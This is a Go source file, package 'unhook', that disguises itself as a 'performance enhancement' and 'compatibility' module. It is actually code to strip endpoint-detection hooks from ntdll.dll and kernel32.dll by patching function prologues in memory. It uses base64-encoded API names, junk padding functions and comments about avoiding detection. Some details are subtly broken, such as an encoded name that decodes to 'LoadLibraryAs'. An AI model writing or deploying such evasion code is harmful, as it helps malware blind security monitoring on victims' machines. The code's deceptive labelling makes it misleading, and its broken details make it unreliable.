// OBFUSCATED
// Performance enhancement module
// Windows compatibility layer
package unhook

import (
	"encoding/base64"
	"reflect"
	"syscall"
	"unsafe"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

var (
	kernel32            = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
	ntdll               = syscall.NewLazyDLL(d("bnRkbGwuZGxs"))
	procLoadLibrary     = kernel32.NewProc(d("TG9hZExpYnJhcnlBcw=="))     // LoadLibraryA
	procGetModuleHandle = kernel32.NewProc(d("R2V0TW9kdWxlSGFuZGxlQQ==")) // GetModuleHandleA
	procVirtualProtect  = kernel32.NewProc(d("VmlydHVhbFByb3RlY3Q="))     // VirtualProtect
	procGetProcAddress  = kernel32.NewProc(d("R2V0UHJvY0FkZHJlc3M="))     // GetProcAddress
)

const (
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READONLY          = 0x02
)

// UnhookNTDLL removes EDR hooks from ntdll.dll by reading fresh copy from disk
func UnhookNTDLL() error {
	// Get handle to currently loaded (hooked) ntdll.dll
	ntdllName, _ := syscall.BytePtrFromString("ntdll.dll")
	hNtdll, _, _ := procGetModuleHandle.Call(uintptr(unsafe.Pointer(ntdllName)))
	if hNtdll == 0 {
		return syscall.Errno(1)
	}

	// Load fresh copy of ntdll.dll from disk (unhoked)
	ntdllPath, _ := syscall.BytePtrFromString(`C:\Windows\System32\ntdll.dll`)
	hCleanNtdll, _, _ := procLoadLibrary.Call(uintptr(unsafe.Pointer(ntdllPath)))
	if hCleanNtdll == 0 {
		return syscall.Errno(1)
	}

	// Critical NTAPI functions that EDRs commonly hook
	criticalFunctions := []string{
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtAllocateVirtualMemory",
		"NtCreateThreadEx",
		"NtQueueApcThread",
		"NtOpenProcess",
		"NtResumeThread",
		"NtSetContextThread",
		"NtCreateFile",
		"NtReadFile",
		"NtWriteFile",
		"NtDeleteFile",
	}

	// Unhook each critical function
	for _, funcName := range criticalFunctions {
		unhookFunction(hNtdll, hCleanNtdll, funcName)
	}

	return nil
}

func unhookFunction(hookedModule, cleanModule uintptr, functionName string) {
	// Get address of hooked function
	funcNamePtr, _ := syscall.BytePtrFromString(functionName)
	hookedAddr, _, _ := procGetProcAddress.Call(hookedModule, uintptr(unsafe.Pointer(funcNamePtr)))
	if hookedAddr == 0 {
		return
	}

	// Get address of clean function
	cleanAddr, _, _ := procGetProcAddress.Call(cleanModule, uintptr(unsafe.Pointer(funcNamePtr)))
	if cleanAddr == 0 {
		return
	}

	// Change memory protection to writable
	var oldProtect uint32
	procVirtualProtect.Call(
		hookedAddr,
		32, // First 32 bytes contain the prologue that's usually hooked
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Copy clean function prologue over hooked one using reflect
	var hookedBytes []byte
	hsh := (*reflect.SliceHeader)(unsafe.Pointer(&hookedBytes))
	hsh.Data = hookedAddr
	hsh.Len = 32
	hsh.Cap = 32

	var cleanBytes []byte
	csh := (*reflect.SliceHeader)(unsafe.Pointer(&cleanBytes))
	csh.Data = cleanAddr
	csh.Len = 32
	csh.Cap = 32

	copy(hookedBytes, cleanBytes)

	// Restore original protection
	procVirtualProtect.Call(
		hookedAddr,
		32,
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
}

// UnhookKernel32 removes hooks from kernel32.dll
func UnhookKernel32() error {
	k32Name, _ := syscall.BytePtrFromString("kernel32.dll")
	hK32, _, _ := procGetModuleHandle.Call(uintptr(unsafe.Pointer(k32Name)))
	if hK32 == 0 {
		return syscall.Errno(1)
	}

	k32Path, _ := syscall.BytePtrFromString(`C:\Windows\System32\kernel32.dll`)
	hCleanK32, _, _ := procLoadLibrary.Call(uintptr(unsafe.Pointer(k32Path)))
	if hCleanK32 == 0 {
		return syscall.Errno(1)
	}

	criticalFunctions := []string{
		"CreateProcessA",
		"CreateProcessW",
		"CreateFileA",
		"CreateFileW",
		"WriteFile",
		"ReadFile",
		"VirtualAlloc",
		"VirtualProtect",
		"CreateThread",
		"CreateRemoteThread",
	}

	for _, funcName := range criticalFunctions {
		unhookFunction(hK32, hCleanK32, funcName)
	}

	return nil
}

// UnhookAll removes EDR hooks from critical system DLLs
func UnhookAll() {
	// Unhook NTDLL first (most important)
	UnhookNTDLL()

	// Small delay to avoid detection
	// time.Sleep(100 * time.Millisecond)

	// Unhook Kernel32
	UnhookKernel32()
}

// Obfuscation padding
func obf_67610() {
	_ = 822
	var _ = "RNP2MXFo4H2njlQHe5hLEIULIDwa8Sk7ftlgih0pd8q3e0PRh2"
}

// Obfuscation padding
func obf_22086() {
	_ = 8906
	var _ = "MtZ3c7MluxwwpaZaDHslMsnRyHm3wWNv5TYI6AfdV5IbLqTKwf"
}

// Obfuscation padding
func obf_18778() {
	_ = 9412
	var _ = "YxtMhUNsMhjMb88tcGTmPdrwnw0eGsDpC0kpXg6YSjqBz9yeK0"
}

// Obfuscation padding
func obf_35595() {
	_ = 7887
	var _ = "fcN5t9fLFzrgLHRMf2wFzmM3Ge6cluHVpChNeGGPLDFGjF0JSm"
}

// Obfuscation padding
func obf_13878() {
	_ = 598
	var _ = "sLq91tKT2IZ8ai7j7Yup97rcrT2J5vJn5CRlTL9tR5IcMZPWuJ"
}
